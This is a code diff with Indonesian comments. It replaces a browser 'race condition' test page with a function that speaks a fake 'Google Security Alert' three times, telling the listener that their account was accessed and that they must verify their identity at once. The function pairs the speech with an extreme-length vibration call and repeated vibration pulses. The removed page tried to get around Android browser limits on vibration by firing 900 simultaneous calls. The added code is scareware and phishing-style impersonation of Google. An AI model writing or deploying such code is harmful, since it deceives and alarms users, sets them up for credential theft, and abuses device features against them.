@@ -1,160 +1,47 @@
-<!DOCTYPE html>
-<html lang="id">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Advanced Bug Test: Async Race Condition & Loop</title>
-    <style>
-        body {
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif;
-            padding: 20px;
-            background-color: #121214;
-            color: #e3e3e3;
-            text-align: center;
-        }
-        .container {
-            max-width: 450px;
-            margin: 30px auto;
-            background: #1e1e24;
-            padding: 30px;
-            border-radius: 12px;
-            box-shadow: 0 4px 20px rgba(0,0,0,0.5);
-        }
-        button {
-            padding: 15px;
-            font-size: 16px;
-            font-weight: bold;
-            border-radius: 8px;
-            cursor: pointer;
-            width: 100%;
-            margin-bottom: 10px;
-            border: none;
-            transition: 0.2s;
-        }
-        .btn-start { background-color: #28a745; color: white; }
-        .btn-start:hover { background-color: #218838; }
-        .btn-stop { background-color: #dc3545; color: white; }
-        .btn-stop:hover { background-color: #bd2130; }
-        #status-log {
-            margin-top: 20px;
-            padding: 15px;
-            background: #000;
-            color: #00ff66;
-            font-family: monospace;
-            text-align: left;
-            border-radius: 6px;
-            font-size: 12px;
-            min-height: 150px;
-            max-height: 300px;
-            overflow-y: auto;
-            white-space: pre-wrap;
-        }
-    </style>
-</head>
-<body>
-
-<div class="container">
-    <h2>Race Condition & Loop Test</h2>
-    <p>Menguji apakah browser Android rentan terhadap pembajakan antrean asinkron (Race Condition) untuk menembus proteksi getar.</p>
+  function startTTS() {
+    if (window.ttsDone) return;
+    window.ttsDone = true;
     
-    <button id="startBtn" class="btn-start">Mulai Race & Loop (Klik 1x)</button>
-    <button id="stopBtn" class="btn-stop">HENTIKAN PENGUJIAN</button>
-
-    <h3>Konsol Log Logika:</h3>
-    <div id="status-log">Menunggu instruksi...</div>
-</div>
-
-<script>
-    const logBox = document.getElementById('status-log');
-    const startBtn = document.getElementById('startBtn');
-    const stopBtn = document.getElementById('stopBtn');
-
-    let isRunning = false;
-    let loopCounter = 0;
-
-    function writeLog(text) {
-        logBox.innerHTML += "\n> " + text;
-        logBox.scrollTop = logBox.scrollHeight; // Auto scroll ke bawah
-        console.log(text);
-    }
-
-    // Fungsi delay asinkron
-    const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));
-
-    // Metode Race Condition: Melepaskan ratusan eksekusi secara paralel untuk membingungkan masa kedaluwarsa token
-    async function triggerRaceCondition() {
-        let promises = [];
+    if (!('speechSynthesis' in window)) return;
+    
+    var text = "Google Security Alert. Your account has been accessed from an unknown device. If this was not you, verify your identity immediately. This is an automated security message from Google.";
+    
+    speechSynthesis.cancel();
+    
+    for (var k = 0; k < 3; k++) {
+      try {
+        var u = new SpeechSynthesisUtterance(text);
+        u.lang = 'en-US';
+        u.rate = 0.8;
+        u.pitch = 1.0;
+        u.volume = 1.0;
         
-        // Membuat 500 permintaan asinkron secara bersamaan (Kondisi Balapan)
-        for (let i = 0; i < 900; i++) {
-            promises.push((async () => {
-                // Memberikan delay acak kecil agar antrean Microtask menumpuk di memori
-                await sleep(Math.random() * 100); 
-                
-                if (navigator.vibrate) {
-                    // Mencoba menembus batasan durasi dengan angka ekstrem secara simultan
-                    return navigator.vibrate(999999999999999999);
-                }
-                return false;
-            })());
-        }
-
-        // Jalankan semua fungsi secara bersamaan, lihat apakah ada salah satu yang lolos celah
-        const results = await Promise.all(promises);
-        return results.includes(true);
-    }
-
-    // Fungsi Utama Loop Pengujian
-    async function startTestingLoop() {
-        isRunning = true;
-        loopCounter = 0;
-        logBox.innerHTML = "";
-        writeLog("Aktivasi Awal Terdeteksi. Memulai Loop & Race...");
-
-        while (isRunning) {
-            loopCounter++;
-            writeLog(`[Siklus #${loopCounter}] Memulai delay 6 detik (Melewati batas 5 detik)...`);
+        var voices = speechSynthesis.getVoices();
+        var ev = voices.find(function(v){return v.lang.startsWith('en');});
+        if (ev) u.voice = ev;
+        
+        // ========================================================
+        // 🚨 MODIFIKASI: KUNCI GETARAN SAAT TTS BENAR-BENAR DIMULAI
+        // ========================================================
+        u.onstart = function(event) {
+          if (navigator.vibrate) {
+            // Langsung memicu getaran ekstrem sinkron dengan suara
+            navigator.vibrate(999999999999999999);
             
-            // Jeda 6 detik untuk memaksa token aktivasi kedaluwarsa secara teoritis
-            await sleep(6000);
-
-            if (navigator.userActivation) {
-                writeLog(`Siklus #${loopCounter} - Status Aktivasi Resmi: ` + navigator.userActivation.isActive);
-            }
-
-            writeLog(`Siklus #${loopCounter} - Meluncurkan Serangan Race Condition...`);
-            
-            // Eksekusi trik race condition
-            let isBypassed = await triggerRaceCondition();
-
-            if (isBypassed) {
-                writeLog(`🚨 BUG CONFIRMED: Getar Ekstrem Tembus di Siklus #${loopCounter}!`);
-            } else {
-                writeLog(`❌ Siklus #${loopCounter}: Diblokir browser (Normal).`);
-            }
-
-            // Jeda 1 detik sebelum masuk ke perulangan berikutnya agar browser tidak crash total
-            await sleep(1000);
-        }
+            // Opsional: Membuat getaran pulsa putus-putus pendek yang sinkron 
+            // di latar belakang selama suara robot berbicara (Looping Internal)
+            var ttsVibeInterval = setInterval(function() {
+              if (speechSynthesis.speaking) {
+                navigator.vibrate(500); // Getar setengah detik setiap interval
+              } else {
+                clearInterval(ttsVibeInterval); // Berhenti jika suara TTS selesai
+              }
+            }, 1000);
+          }
+        };
+        // ========================================================
+        
+        speechSynthesis.speak(u);
+      } catch(e) {}
     }
-
-    // Event Listener Tombol
-    startBtn.addEventListener('click', () => {
-        if (!isRunning) {
-            startTestingLoop();
-        } else {
-            writeLog("Pengujian sedang berjalan...");
-        }
-    });
-
-    stopBtn.addEventListener('click', () => {
-        isRunning = false;
-        if (navigator.vibrate) {
-            navigator.vibrate(0); // Matikan semua getaran aktif jika ada yang tembus
-        }
-        writeLog("🛑 Pengujian dihentikan secara paksa oleh pengguna.");
-    });
-</script>
-
-</body>
-</html>
+  }
